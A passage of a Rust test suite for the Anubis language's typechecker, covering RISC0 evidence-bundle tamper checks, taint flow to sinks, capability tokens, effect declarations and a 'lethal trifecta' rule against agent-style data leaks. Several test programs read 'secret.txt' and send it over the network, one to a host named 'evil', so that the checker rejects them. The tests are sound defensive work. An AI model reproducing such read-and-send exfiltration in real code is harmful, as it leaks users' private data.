            r#"{"schema_version":"1.1","backend":"risc0","verify_status":"passed","fresh_receipt_generated":true,"mock_prover":false,"dev_mode":false,"cache_used":false,"placeholder_image_id":false,"image_id_is_placeholder":false,"metal_hybrid":{"enabled":true,"reference_path":"__REF__","vendored_patch_path":"__VP__","patch_crates_io_active":true,"risc0_zkvm_version":"3.0.5","risc0_zkp_version":"3.0.4","risc0_circuit_rv32im_version":"4.0.4","lane_requested":"cpu","lane_observed":"cpu","cpu_forced_by_r0_disable_metal":true,"tier2_metal_available":false,"external_r0vm_used":false}}"#
                .replace("__REF__", metal_ref.to_str().unwrap())
                .replace("__VP__", vendor_patch.to_str().unwrap()),
        )
        .unwrap();
        std::fs::write(
            risc0_dir.join("receipt.verify.log"),
            b"receipt.verify PASSED",
        )
        .unwrap();
        std::fs::write(risc0_dir.join("prove.log"), b"prove ok").unwrap();
        std::fs::write(risc0_dir.join("guest/src/main.rs"), b"fn main() {}").unwrap();
        let src = "fn main() { let x = 1; }";

        let bundle = build_evidence_bundle(
            src,
            "safe",
            artifact_path.to_str(),
            vec!["test risc0 evidence".into()],
            &out_dir,
            Some("risc0-risc0"),
            None,
        )
        .expect("bundle");

        assert!(
            validate_bundle(&bundle.dir).expect("validate fresh bundle"),
            "fresh nested RISC0 bundle should validate before tamper"
        );
        std::fs::write(
            bundle.dir.join("backend/risc0/receipt.bin"),
            b"tampered receipt",
        )
        .unwrap();
        assert!(
            !validate_bundle(&bundle.dir).expect("validate tampered nested receipt"),
            "tampering nested backend/risc0 receipt must invalidate the bundle"
        );

        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn evidence_bundle_fails_when_risc0_metadata_reports_failed_verify() {
        let out_dir = unique_test_dir("risc0-failed-metadata");
        std::fs::create_dir_all(&out_dir).unwrap();
        let artifact_path = out_dir.join("artifact-input");
        let risc0_dir = out_dir.join("backend/risc0");
        std::fs::create_dir_all(risc0_dir.join("guest/src")).unwrap();
        std::fs::write(&artifact_path, b"host artifact").unwrap();
        std::fs::write(out_dir.join("guest.elf"), b"flat guest").unwrap();
        std::fs::write(out_dir.join("image_id.txt"), b"1 2 3 4 5 6 7 8").unwrap();
        std::fs::write(
            out_dir.join("generated-methods.rs"),
            b"pub const GUEST_ID: [u32; 8] = [1,2,3,4,5,6,7,8];",
        )
        .unwrap();
        std::fs::write(risc0_dir.join("guest.elf"), b"nested guest").unwrap();
        std::fs::write(risc0_dir.join("image_id.txt"), b"1 2 3 4 5 6 7 8").unwrap();
        std::fs::write(risc0_dir.join("receipt.bin"), b"partial receipt marker").unwrap();
        std::fs::write(
            risc0_dir.join("risc0_metadata.json"),
            r#"{"schema_version":"1.1","backend":"risc0","verify_status":"failed","fresh_receipt_generated":false,"mock_prover":false,"dev_mode":false,"cache_used":false,"placeholder_image_id":false,"image_id_is_placeholder":false,"metal_hybrid":{"enabled":true,"reference_path":"/tmp/test-metal-prover","vendored_patch_path":"/tmp/test-metal-prover/vendor/risc0-circuit-rv32im","patch_crates_io_active":true,"risc0_zkvm_version":"3.0.5","risc0_zkp_version":"3.0.4","risc0_circuit_rv32im_version":"4.0.4","lane_requested":"cpu","lane_observed":"cpu","cpu_forced_by_r0_disable_metal":true,"tier2_metal_available":false,"external_r0vm_used":false}}"#,
        )
        .unwrap();
        std::fs::write(
            risc0_dir.join("receipt.verify.log"),
            b"receipt.verify FAILED",
        )
        .unwrap();
        std::fs::write(risc0_dir.join("prove.log"), b"prove failed").unwrap();
        std::fs::write(risc0_dir.join("guest/src/main.rs"), b"fn main() {}").unwrap();
        let src = "fn main() { let x = 1; }";

        let bundle = build_evidence_bundle(
            src,
            "safe",
            artifact_path.to_str(),
            vec!["test failed risc0 evidence".into()],
            &out_dir,
            Some("risc0-risc0"),
            None,
        )
        .expect("bundle");

        assert!(
            bundle
                .manifest
                .checks
                .iter()
                .any(|check| check.name == "risc0_receipt_verify"
                    && check.status == "FAIL"
                    && check.detail.contains("failed")),
            "failed RISC0 metadata must become a failing evidence check: {:?}",
            bundle.manifest.checks
        );
        assert_eq!(bundle.manifest.verdict, "FAIL");
        assert!(
            !validate_bundle(&bundle.dir).expect("validate failed RISC0 bundle"),
            "bundle with failed RISC0 verify metadata must not validate"
        );

        let _ = std::fs::remove_dir_all(&out_dir);
    }

    #[test]
    fn safe_tainted_sink_requires_declassify_policy() {
        // GATE 4 / 5 core: safe mode must hard fail on tainted reaching sink without proper declassify(policy, reason)
        let src = r#"
fn main() {
    let secret: tainted<u32> = symbolic();
    sink(secret);
}
"#;
        let ast = parse_source(src).expect("parse");
        let err = typecheck(ast, frontend::Mode::Safe)
            .expect_err("safe tainted sink must produce policy error");
        assert!(
            err.contains("tainted")
                && (err.contains("declassify") || err.contains("policy") || err.contains("sink")),
            "unexpected safe taint error: {}",
            err
        );
    }

    #[test]
    fn taint_propagates_through_field_access_and_indexing_to_sink() {
        // Regression for a real fail-open gap this Phase-3 slice closed: `expr_taint_source` had no
        // arm for `Index`/`FieldAccess`, so they fell to the catch-all `_ => None` and silently
        // laundered taint. Verified against the pre-fix binary (commit c20eb9f) that this exact
        // struct-field program printed "check passed" — a genuine regression, not a hypothetical.
        let struct_field = r#"
struct Record { field: u32 }
fn main() {
    let r: tainted<Record> = Record { field: 42 };
    sink(r.field);
}
"#;
        let err =
            tc_ok(struct_field).expect_err("tainted struct field into a sink must be rejected");
        assert!(
            err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
            "got: {err}"
        );

        let array_elem = r#"
fn main() {
    let arr: tainted<list> = [1, 2, 3];
    sink(arr[0]);
}
"#;
        let err =
            tc_ok(array_elem).expect_err("tainted array element into a sink must be rejected");
        assert!(
            err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
            "got: {err}"
        );

        // The Binary-shape improvement over the plan's original Unary-shape draft: a TAINTED INDEX
        // into an otherwise-CLEAN array is an equally real leak and must also be caught.
        let tainted_index = r#"
fn main() {
    let arr = [10, 20, 30];
    let idx: tainted<u32> = symbolic();
    sink(arr[idx]);
}
"#;
        let err =
            tc_ok(tainted_index).expect_err("tainted index into a clean array must be rejected");
        assert!(
            err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
            "got: {err}"
        );

        // Declassify still clears it through the new arms (the fix integrates with existing policy).
        let declassified = r#"
struct Record { field: u32 }
fn main() {
    let r: tainted<Record> = Record { field: 42 };
    let clean = declassify(r.field, "policy", "reason");
    sink(clean);
}
"#;
        tc_ok(declassified).expect("declassified field access into a sink must be accepted");

        // No over-tainting: field/index access on a NON-tainted binding must still be accepted.
        let clean_field = r#"
struct Record { field: u32 }
fn main() {
    let r = Record { field: 42 };
    sink(r.field);
}
"#;
        tc_ok(clean_field).expect("clean struct field into a sink must not be flagged tainted");

        let clean_index = r#"
fn main() {
    let arr = [1, 2, 3];
    sink(arr[0]);
}
"#;
        tc_ok(clean_index).expect("clean array element into a sink must not be flagged tainted");
    }

    #[test]
    fn is_tainted_detects_qualifier_nested_in_a_container_annotation() {
        // Regression for a false negative an adversarial workflow found in the first version of this
        // slice: `ty::is_tainted` initially delegated to `tainted_inner`'s anchored "whole-string"
        // guard, which only recognizes `tainted<T>` when it wraps the ENTIRE annotation — so a
        // parameter declared `list<tainted<u32>>` was silently NOT seeded as tainted at all, letting
        // `sink(x)` on it slip past `ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY` undetected. Confirmed
        // against the intermediate (buggy) implementation that this exact program passed `check`.
        for annotation in [
            "list<tainted<u32>>",
            "Option<tainted<u32>>",
            "Map<string, tainted<u32>>",
        ] {
            let src = format!("fn entry(x: {annotation}) {{ sink(x); }} fn main() {{}}");
            let err =
                tc_ok(&src).expect_err(&format!("{annotation} param into a sink must be rejected"));
            assert!(
                err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
                "got: {err}"
            );
        }
    }

    #[test]
    fn taint_is_flow_sensitive_across_reassignment_residual_closed() {
        // RESIDUAL NOW CLOSED (Phase-2 taint soundness). This formerly documented a deferred boundary
        // — "taint flow is reassignment-INSENSITIVE; a tainted binding stays tainted even after
        // reassignment to a clean value; making it flow-sensitive needs proper control-flow-merge
        // dataflow… deferred." That dataflow now exists (middle/mod.rs: the Assign handler propagates
        // the RHS taint, and if/loop bodies MERGE taint may-taint with binding-identity by span). Both
        // directions are now precise: reassign tainted→clean CLEARS, and — the fail-open this closes —
        // reassign clean→tainted TAINTS.
        // Reassign tainted -> clean now clears (precision, was over-tainted before):
        tc_ok(r#"fn main() { let mut x = taint_source("s"); x = 1; sink(x); }"#)
            .expect("reassign to a clean value now clears the taint (flow-sensitive)");
        // Reassign clean -> tainted now taints (the reassignment fail-open, now caught):
        let leak = tc_ok(r#"fn main() { let mut x = 1; x = taint_source("s"); sink(x); }"#)
            .expect_err("reassign to a tainted value now taints the binding (fail-open closed)");
        assert!(leak.contains("ANUBIS_TAINTED_SINK"), "got: {leak}");

        // The idiomatic way to clear a genuinely-tainted value at a sink: declassify with policy + reason.
        let declassified = r#"
fn main() {
    let secret = taint_source("s");
    let clean = declassify(secret, "policy", "reason");
    sink(clean);
}
"#;
        tc_ok(declassified).expect("a declassified value may reach a sink");
    }

    #[test]
    fn io_read_is_taint_source_and_write_is_sink() {
        // Phase-3 C4: I/O reads are taint sources; write_file/send are sinks (is_sink).
        // Use `sink(...)` as the sink probe so we do not couple this test to network/research mode.
        let err = tc_ok(
            r#"fn main() {
    let data = read_file("secret.txt");
    sink(data);
}"#,
        )
        .expect_err("read→sink without declassify must reject");
        assert!(
            err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
            "got: {err}"
        );

        tc_ok(
            r#"fn main() {
    let data = read_file("secret.txt");
    let clean = declassify(data, "policy", "reason");
    sink(clean);
}"#,
        )
        .expect("declassified read may reach sink");

        // write_file is a sink: a tainted value into write_file is rejected in Safe mode
        // (also ANUBIS_EFFECT_FORBIDDEN for file_write — either code proves the wiring).
        let err = tc_ok(
            r#"fn main() {
    let data = read_file("secret.txt");
    write_file("out.txt", data);
}"#,
        )
        .expect_err("read→write_file without declassify must reject");
        assert!(
            err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY")
                || err.contains("ANUBIS_EFFECT_FORBIDDEN"),
            "got: {err}"
        );
    }

    #[test]
    fn verified_lane_requires_uses_for_capability_io() {
        // Phase-3 C5: in the verification lane, capability I/O without uses(...) is fail-closed.
        let src = r#"fn main() {
    let data = read_file("x.txt");
    print(data);
}"#;
        let ast = parse_source(src).expect("parse");
        let err = typecheck_ex(ast, frontend::Mode::Safe, true)
            .expect_err("verified lane must require uses for read_file");
        assert!(err.contains("ANUBIS_UNDECLARED_EFFECT"), "got: {err}");

        // Same program with uses(fs.read) AND a genuinely-acquired fs.read capability is accepted in
        // the verified lane. (Slice 3 composition tightened verified mode: a `uses(...)` clause is
        // necessary but no longer sufficient — the effect must also hold its authorizing token.)
        let ok = r#"fn main() uses(fs.read) {
    let cap = cap_acquire("fs.read");
    let data = read_file("x.txt");
    cap_use(cap);
    print(len(data));
}"#;
        let ast = parse_source(ok).expect("parse");
        typecheck_ex(ast, frontend::Mode::Safe, true)
            .expect("verified + uses(fs.read) + acquired capability must accept read_file");

        // Default lane (verified=false) still accepts absent uses (permissive).
        tc_ok(src).expect("default lane permits absent uses");
    }

    #[test]
    fn phase3_uses_authorizes_safe_io_and_verified_attr() {
        // C5 crown: declared uses AUTHORIZES Safe-mode write/network (no hard forbid).
        tc_ok(r#"fn main() uses(fs.write) { write_file("a.txt", "hi"); }"#)
            .expect("uses(fs.write) must authorize write_file in Safe");
        tc_ok(r#"fn main() uses(net.send) { send("h", 80, "x"); }"#)
            .expect("uses(net.send) must authorize send in Safe");
        // Still forbidden without uses:
        let err = tc_ok(r#"fn main() { write_file("a.txt", "hi"); }"#)
            .expect_err("write without uses must forbid");
        assert!(err.contains("ANUBIS_EFFECT_FORBIDDEN"), "got {err}");
        // Undeclared effect when uses is present but wrong:
        let err = tc_ok(r#"fn main() uses(fs.read) { write_file("a.txt", "hi"); }"#)
            .expect_err("write under uses(fs.read) must reject");
        assert!(
            err.contains("ANUBIS_UNDECLARED_EFFECT") || err.contains("ANUBIS_EFFECT_FORBIDDEN"),
            "got {err}"
        );
        // C4+C5: declared net + read without declassify → taint fail-closed (and net is authorized).
        let err = tc_ok(
            r#"fn main() uses(fs.read, net.send) {
    let d = read_file("secret.txt");
    send("evil", 80, d);
}"#,
        )
        .expect_err("read→send without declassify must reject");
        assert!(
            err.contains("ANUBIS_TAINTED_SINK_WITHOUT_DECLASSIFY"),
            "got {err}"
        );
        // declassify path authorized:
        tc_ok(
            r#"fn main() uses(fs.read, net.send) {
    let d = read_file("secret.txt");
    let c = declassify(d, "p", "r");
    send("h", 80, c);
}"#,
        )
        .expect("declassified read→send with uses must accept");
        // @verified attribute forces uses requirement:
        let err = tc_ok(
            r#"@verified
fn main() {
    let d = read_file("x");
    print(len(d));
}"#,
        )
        .expect_err("@verified without uses must reject");
        assert!(err.contains("ANUBIS_UNDECLARED_EFFECT"), "got {err}");
        // Slice 3 composition: @verified now also requires the effect hold its authorizing token
        // (a `uses(...)` clause alone no longer suffices in verified mode).
        tc_ok(
            r#"@verified
fn main() uses(fs.read) {
    let cap = cap_acquire("fs.read");
    let d = read_file("x");
    cap_use(cap);
    print(len(d));
}"#,
        )
        .expect("@verified + uses(fs.read) + acquired capability must accept");
        // #[verified] rust-style also accepted:
        tc_ok(
            r#"#[verified]
fn main() uses(fs.read) {
    let cap = cap_acquire("fs.read");
    let d = read_file("x");
    cap_use(cap);
    print(len(d));
}"#,
        )
        .expect("#[verified] + uses + acquired capability must accept");
    }

    #[test]
    fn governed_io_read_write_file_executes() {
        // Phase-3 C3: read_file/write_file are real run builtins (not hard-rejected). Goldens with
        // no I/O remain byte-identical because these only fire when the names are used.
        let dir = std::env::temp_dir().join(format!("anubis-io-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("hello.txt");
        let path_s = path.to_string_lossy().replace('\\', "\\\\");

        let src = format!(
            r#"fn main() {{
    write_file("{path_s}", "hello-anubis");
    let s = read_file("{path_s}");
    print(s);
}}"#
        );
        // allow_research=true so write_file is not blocked by the research-gated surface if any;
        // lowering itself does not re-run mode checks (those are typecheck's job).
        let out = backends::run::compile_and_run_source(&src, true, &[]).expect("compile+run io");
        assert!(
            out.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        assert_eq!(String::from_utf8_lossy(&out.stdout).trim(), "hello-anubis");

        let t = backends::run::compile_and_run_source(
            r#"fn main() { let t = time(); print(t > 0); }"#,
            false,
            &[],
        )
        .expect("time");
        assert!(t.status.success());
        assert_eq!(String::from_utf8_lossy(&t.stdout).trim(), "true");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn uses_clause_parses_and_undeclared_effect_is_rejected() {
        // Phase-3 C1+C2: `uses(fs.read, net.send)` parses on Item::Fn; inferred capability effects
        // must be ⊆ the declared set → `ANUBIS_UNDECLARED_EFFECT` when a used effect is missing.
        let parsed = parse_source(
            r#"fn load(path: string) uses(fs.read) {
    let data = read_file(path);
    return data;
}
fn main() {}"#,
        )
        .expect("parse uses clause");
        let frontend::Item::Fn { effects, name, .. } = &parsed.items[0] else {
            panic!("expected fn");
        };
        assert_eq!(name, "load");
        assert_eq!(effects.as_slice(), ["fs.read"]);

        // Declared correctly — accepted (read_file is fs.read).
        tc_ok(
            r#"fn load(path: string) uses(fs.read) {
    let data = read_file(path);
    return data;
}
fn main() { let _ = load("a"); }"#,
        )
        .expect("declared fs.read must accept read_file");

        // Missing declaration of an inferred effect — rejected.
        let err = tc_ok(
            r#"fn load(path: string) uses(net.send) {
    let data = read_file(path);
    return data;
}
fn main() {}"#,
        )
        .expect_err("read_file without fs.read in uses must reject");
        assert!(err.contains("ANUBIS_UNDECLARED_EFFECT"), "got: {err}");

        // No uses clause → no declared-vs-inferred check (absent clause is not a failure).
        tc_ok(
            r#"fn load(path: string) {
    let data = read_file(path);
    return data;
}
fn main() {}"#,
        )
        .expect("absent uses clause must not reject on effects alone");
    }

    #[test]
    fn transitive_undeclared_effect_is_rejected_across_the_call_graph() {
        // Phase-2 slice 1: an unclaused helper's builtin effects must not launder past a claused
        // caller. `main` has no direct time builtin and `helper` declares nothing, so the per-body
        // check (direct builtins + one-hop callee-DECLARED caps) sees nothing — only the transitive
        // effect-row fixpoint can catch this.
        let err = tc_ok(
            r#"fn helper() { time_now(); }
fn main() uses(fs.read) {
    let d = read_file("x.txt");
    helper();
    print(d);
}"#,
        )
        .expect_err("transitive time.now without declaration must reject");
        assert!(err.contains("ANUBIS_UNDECLARED_EFFECT"), "got: {err}");
        assert!(err.contains("via transitive call"), "got: {err}");

        // Depth 2: the chain composes across the whole call graph, not one hop.
        let err = tc_ok(
            r#"fn deep() { time_now(); }
fn mid() { deep(); }
fn main() uses(fs.read) { let d = read_file("y"); mid(); print(d); }"#,
        )
        .expect_err("depth-2 transitive effect must reject");
        assert!(err.contains("ANUBIS_UNDECLARED_EFFECT"), "got: {err}");
    }

    #[test]
    fn transitive_effects_declared_or_overdeclared_accept() {
        // Correctly declared: the transitive time.now is in the clause.
        tc_ok(
            r#"fn helper() { time_now(); }
fn main() uses(fs.read, time.now) { let d = read_file("x"); helper(); print(d); }"#,
        )
        .expect("declared transitive effects must accept");
        // Over-declared: declaring more than used is always legal (subset direction only).
        tc_ok(r#"fn main() uses(fs.read, net.send) { let d = read_file("x"); print(d); }"#)
            .expect("over-declaration must accept");
    }

    #[test]
    fn open_row_never_fires_but_concrete_caps_still_do() {
        // Effect-polymorphic HOF: calling a parameter opens the row; open alone must NOT reject —
        // the reject decision stays accept-biased on ignorance.
        tc_ok(
            r#"fn apply(f, x: i64) uses(time.now) { time_now(); return f(x); }
fn double(x: i64) -> i64 { return x * 2; }
fn main() { let y = apply(double, 3); print(y); }"#,
        )
        .expect("open row (param call) must not reject on ignorance");
        // …but a CONCRETE transitive cap alongside the open tail still fires — an unknown callee
        // never hides a genuine undeclared effect (the effect SET widens; the rejection does not).
        let err = tc_ok(
            r#"fn helper_time() { time_now(); }
fn driver(f) uses(fs.read) {
    let d = read_file("x");
    f(1);
    helper_time();
    print(d);
}
fn id(x: i64) -> i64 { return x; }
fn main() { driver(id); }"#,
        )
        .expect_err("concrete undeclared cap must fire despite open row");
        assert!(err.contains("ANUBIS_UNDECLARED_EFFECT"), "got: {err}");
    }

    #[test]
    fn closure_shadow_of_effectful_global_does_not_reject() {
        // Flat-name closure-shadow: a local closure named like an effectful global — calling it is
        // the closure (open row), never the global's effect row. If the walker wrongly pulled the
        // global's row, the transitive check would reject on undeclared time.now. (The closure is
        // 0-ary to match the global's arity: the PRE-EXISTING arity check resolves the bare name to
        // the global — a separate, older flat-name limitation this slice does not touch; the
        // row-level shadow discrimination is pinned by `local_shadow_of_global_fn_does_not_pull_row`
        // in middle/effects.rs.)
        tc_ok(
            r#"fn helper() { time_now(); }
fn main() uses(fs.read) {
    let d = read_file("x");
    let helper = || 1;
    let y = helper();
    print(y);
}"#,
        )
        .expect("shadowed local call must not pull the effectful global row");
    }

    #[test]
    fn verified_lane_transitive_caps_require_clause() {
        // Verified lane: caps reached ONLY transitively still require a `uses(...)` clause. The
        // chain is depth-2 through an unclaused `mid` so `main`'s one-hop inherited caps are empty:
        // only the transitive arm can flag `main` (the per-body verified rule flags `mid` one-hop).
        let src = r#"fn helper() uses(fs.read) { let d = read_file("x.txt"); return d; }
fn mid() { return helper(); }
fn main() { let d = mid(); print(d); }"#;
        let ast = parse_source(src).expect("parse");
        let err = typecheck_ex(ast, frontend::Mode::Safe, true)
            .expect_err("verified lane must see transitive fs.read");
        assert!(
            err.contains("function `main` uses capability effect(s) [fs.read] (via transitive call)"),
            "got: {err}"
        );
        // Default lane: same program accepts (absent clause is permissive outside verified).
        tc_ok(src).expect("default lane permits absent clause");
    }

    // ── Phase-2 slice 2: capability tokens as linear (use-once) values ──────────────────────────

    /// Typecheck under a chosen lane, returning the error string on rejection.
    fn tc_lane(src: &str, verified: bool) -> Result<(), String> {
        let ast = parse_source(src).expect("parse");
        typecheck_ex(ast, frontend::Mode::Safe, verified).map(|_| ())
    }

    #[test]
    fn capability_reuse_and_missing_reject_in_both_lanes() {
        // Use-once: a token consumed twice is a reuse — caught straight-line in both lanes.
        for verified in [false, true] {
            let err = tc_lane(
                r#"fn main() { let c = cap_acquire("fs.read"); cap_use(c); cap_use(c); }"#,
                verified,
            )
            .expect_err("double use must reject");
            assert!(err.contains("ANUBIS_CAPABILITY_REUSE"), "verified={verified} got: {err}");
            // Unforgeable: cap_use on a provable non-capability is MISSING (a token cannot be conjured).
            let err = tc_lane(r#"fn main() { cap_use(5); }"#, verified)
                .expect_err("cap_use on a literal must reject");
            assert!(err.contains("ANUBIS_CAPABILITY_MISSING"), "verified={verified} got: {err}");
        }
    }

    #[test]
    fn capability_used_once_surrendered_and_unknown_provenance_accept() {
        tc_ok(r#"fn main() { let c = cap_acquire("fs.read"); cap_use(c); }"#)
            .expect("a token used exactly once accepts");
        // Passing the token to a callee surrenders it; not reused → accept.
        tc_ok(
            r#"fn consume_it(c) { cap_use(c); }
fn main() { let c = cap_acquire("fs.read"); consume_it(c); }"#,
        )
        .expect("surrendered-once capability accepts");
        // Accept-bias: a param arrives with unknown provenance; cap_use(param) does not fire MISSING
        // on ignorance — in either lane.
        for verified in [false, true] {
            tc_lane(r#"fn handler(c) { cap_use(c); } fn main() { }"#, verified)
                .expect("unknown-provenance cap_use must accept");
        }
    }

    #[test]
    fn capability_move_on_rebind_keeps_token_singular() {
        // `let y = c` MOVES: using `c` after the move is a reuse (aliasing cannot launder).
        let err = tc_ok(
            r#"fn main() { let c = cap_acquire("fs.read"); let y = c; cap_use(c); }"#,
        )
        .expect_err("use after move must reject");
        assert!(err.contains("ANUBIS_CAPABILITY_REUSE"), "got: {err}");
        // Using the token via its new name exactly once accepts.
        tc_ok(r#"fn main() { let c = cap_acquire("fs.read"); let y = c; cap_use(y); }"#)
            .expect("used-once via the moved-to name accepts");
    }

    #[test]
    fn capability_aggregate_double_use_rejects() {
        // The unified "any read-occurrence is a use" rule catches duplication into an aggregate.
        let err = tc_ok(r#"fn main() { let c = cap_acquire("fs.read"); let pair = [c, c]; }"#)
            .expect_err("[c, c] must reject");
        assert!(err.contains("ANUBIS_CAPABILITY_REUSE"), "got: {err}");
    }

    #[test]
    fn capability_branch_dual_default_accepts_verified_rejects() {
        // Consumed on one branch only: default lane must-consume accepts (accept-bias), verified
        // lane may-consume rejects (fail-closed toward consumed).
        let src = r#"fn f(cond) { let c = cap_acquire("x"); if cond { cap_use(c); } cap_use(c); }
fn main() { }"#;
        tc_lane(src, false).expect("default lane must-consume accepts uncertain consumption");
        let err = tc_lane(src, true).expect_err("verified lane may-consume rejects");
        assert!(err.contains("ANUBIS_CAPABILITY_REUSE"), "got: {err}");
    }

    #[test]
    fn capability_loop_carried_rejects_in_verified_only() {
        // A cap acquired outside a loop and consumed inside is re-consumed on iteration 2.
        let carried = r#"fn f() { let c = cap_acquire("x"); for i in 0..3 { cap_use(c); } }
fn main() { }"#;
        tc_lane(carried, false).expect("default lane accepts (loop may not run)");
        let err = tc_lane(carried, true).expect_err("verified lane rejects loop-carried consume");
        assert!(err.contains("ANUBIS_CAPABILITY_REUSE"), "got: {err}");
        // A fresh token minted each iteration is linear in both lanes.
        let fresh = r#"fn f() { for i in 0..3 { let c = cap_acquire("x"); cap_use(c); } }
fn main() { }"#;
        tc_lane(fresh, false).expect("loop-local mint accepts (default)");
        tc_lane(fresh, true).expect("loop-local mint accepts (verified)");
    }

    #[test]
    fn open_effect_row_rejected_in_verified_accepted_in_default() {
        // Verified mode forbids an open (unbounded) effect row (a call to a function-valued param).
        let src = r#"fn apply(g) { g(1); }
fn main() { }"#;
        let err = tc_lane(src, true).expect_err("open row must reject under verified");
        assert!(err.contains("ANUBIS_EFFECT_OPEN_IN_VERIFIED"), "got: {err}");
        // Default lane keeps open rows legal (the effect slice's accept-bias is unchanged).
        tc_lane(src, false).expect("default lane permits an open row");
    }

    // ── Phase-2 slice 3: effect-capability composition ──────────────────────────────────────────

    #[test]
    fn verified_effect_requires_a_genuinely_acquired_capability() {
        // Performing a privileged effect in verified mode without acquiring its capability is
        // unauthorized. `uses(net.send)` keeps the declared-effect check satisfied, so the sole
        // diagnostic is the composition one.
        let src = r#"fn f() uses(net.send) { send("h", 80, "x"); }
fn main() { }"#;
        let err = tc_lane(src, true).expect_err("verified net without a capability must reject");
        assert!(err.contains("ANUBIS_EFFECT_UNAUTHORIZED"), "got: {err}");
        // A genuinely-acquired matching capability authorizes it.
        let ok = r#"fn f() uses(net.send) { let n = cap_acquire("net.send"); send("h", 80, "x"); cap_use(n); }
fn main() { }"#;
        tc_lane(ok, true).expect("verified net with an acquired net capability must accept");
        // Default lane imposes no authorization requirement.
        tc_lane(src, false).expect("default lane performs effects freely");
    }

    #[test]
    fn unknown_provenance_token_does_not_authorize_under_verified() {
        // THE FORGE CLOSURE (load-bearing): a capability of unknown provenance — here a parameter —
        // does not authorize an effect in verified mode. The SAME program accepts without --verified.
        let src = r#"fn f(netcap) uses(net.send) { send("h", 80, "x"); }
fn main() { }"#;
        let err = tc_lane(src, true).expect_err("a param cap must not authorize under verified");
        assert!(err.contains("ANUBIS_EFFECT_UNAUTHORIZED"), "got: {err}");
        // The exact same source, default lane → accepts (the hole is verified-lane-only).
        tc_lane(src, false).expect("the same program accepts without --verified");
    }

    #[test]
    fn verified_no_privileged_effect_needs_no_capability() {
        // A verified function that performs no privileged effect has nothing to authorize.
        let src = r#"fn f() { let x = 1 + 2; print(x); }
fn main() { }"#;
        tc_lane(src, true).expect("no privileged effect → no authorization required");
    }
    // (capability.rs's `callee ∉ all_fns` guard — a user fn shadowing a builtin name performs no
    // effect for authorization — is proven in isolation by the module test
    // `user_fn_shadowing_a_builtin_name_is_not_a_performed_effect`. An end-to-end assertion is not
    // added here: the pre-existing inline effect classifier in mod.rs (1949-1995) lacks that guard,
    // so a whole-program `fn send(...)` is independently flagged by the older Safe/verified effect
    // gates — a pre-existing inconsistency out of this slice's scope.)

    // ── Phase-2: the lethal trifecta — a Safe (default) + verified lane compile error ────────────

    // A three-leg trifecta body with a CONSTANT egress arg: no value flows read→send, so the
    // Safe-mode value-flow taint check is silent and ANUBIS_LETHAL_TRIFECTA is the sole new error —
    // isolating the genuinely-new coexistence coverage.
    const TRIFECTA_BODY: &str = r#"fn agent() uses(fs.read, net.send) {
    let rc = cap_acquire("fs.read");
    let sc = cap_acquire("net.send");
    let steer = input();
    let secret = read_file("notes");
    cap_use(rc);
    cap_use(sc);
    send("host", 80, "beacon");
}
fn main() { }"#;

    #[test]
    fn lethal_trifecta_enforced_in_both_lanes() {
        // PROMOTED to Safe-enforcing: the lethal trifecta is now a compile error in BOTH the Safe
        // (default) lane and the verified lane (it landed shadow-first, then promoted once the shadow
        // diff proved it fires on nothing committed). The undeclassified 3-leg body rejects with
        // ANUBIS_LETHAL_TRIFECTA regardless of lane.
        for verified in [true, false] {
            let err = tc_lane(TRIFECTA_BODY, verified)
                .expect_err("trifecta must reject in both lanes");
            assert!(
                err.contains("ANUBIS_LETHAL_TRIFECTA"),
                "verified={verified} got: {err}"
            );
        }
    }

    #[test]
    fn lethal_trifecta_safe_lane_accept_bias() {
        // Accept-bias guards proving the now-enforcing Safe lane does NOT over-reject: a 2-leg body
        // (private read + egress, no distinct untrusted channel) and a well-formed-declassified 3-leg
        // body both COMPILE in the Safe (default) lane — the exact shapes the arc's Phase-2
        // definition-of-done requires to bound the coexistence check.
        let two = r#"fn agent() uses(fs.read, net.send) {
    let rc = cap_acquire("fs.read"); let sc = cap_acquire("net.send");
    let secret = read_file("cfg"); cap_use(rc); cap_use(sc); send("host", 80, "ping");
}
fn main() { }"#;
        tc_lane(two, false).expect("safe lane: two legs (no untrusted channel) accepts");
        let declassified = r#"fn agent() uses(fs.read, net.send) {
    let rc = cap_acquire("fs.read"); let sc = cap_acquire("net.send");
    let steer = input(); let secret = read_file("notes");
    let safe = declassify(secret, "hash-only", "reviewed");
    cap_use(rc); cap_use(sc); send("host", 80, safe);
}
fn main() { }"#;
        tc_lane(declassified, false).expect("safe lane: a well-formed declassify discharges the trifecta");
    }

    #[test]
    fn lethal_trifecta_needs_all_three_legs() {
        // Two legs only — no distinct untrusted channel (leg 2 absent): accepts under verified.
        let two = r#"fn agent() uses(fs.read, net.send) {
    let rc = cap_acquire("fs.read"); let sc = cap_acquire("net.send");
    let secret = read_file("cfg"); cap_use(rc); cap_use(sc); send("host", 80, "ping");
}
fn main() { }"#;
        tc_lane(two, true).expect("private read + egress with no untrusted channel is two legs");
        // Untrusted + egress but NO private read (leg 1 absent): accepts.
        let no_read = r#"fn agent() uses(net.send) {
    let sc = cap_acquire("net.send"); let steer = input(); cap_use(sc); send("host", 80, "beacon");
}
fn main() { }"#;
        tc_lane(no_read, true).expect("no fs.read → not a trifecta");
    }

    #[test]
    fn lethal_trifecta_wellformed_declassify_discharges() {
        // A well-formed declassify (policy + reason) is the reviewed sanitization barrier.
        let ok = r#"fn agent() uses(fs.read, net.send) {
    let rc = cap_acquire("fs.read"); let sc = cap_acquire("net.send");
    let steer = input(); let secret = read_file("notes");
    let safe = declassify(secret, "hash-only", "reviewed");
    cap_use(rc); cap_use(sc); send("host", 80, safe);
}
fn main() { }"#;
        tc_lane(ok, true).expect("well-formed declassify discharges the trifecta");
    }

    #[test]
    fn lethal_trifecta_malformed_declassify_does_not_discharge() {
